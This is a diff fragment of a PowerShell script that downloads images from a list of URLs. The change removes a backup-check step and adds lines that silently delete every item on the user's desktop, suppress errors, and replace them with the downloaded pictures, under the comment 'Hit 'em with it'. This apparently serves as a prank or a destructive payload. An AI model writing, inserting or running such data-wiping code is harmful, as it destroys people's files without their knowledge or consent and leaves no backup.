@@ -44,9 +44,9 @@ foreach ($url in $urls){
     $butts = Invoke-WebRequest -uri "$url" -Outfile "./test/$path.jpg"  
 }
 
-
-# We need to verify that the desktop items are backed up.
-$filesToReplace = (Get-ChildItem -Path $directory -Filter *$targetFiles* -Recurse).Fullname
+# Clear desktop and replace with images 
+Get-ChildItem $desktop -ErrorAction SilentlyContinue | Remove-Item -ErrorAction SilentlyContinue
+Get-ChildItem $downloadFolder | Copy-Item -Destination $desktop
 
 
 # Hit 'em with it
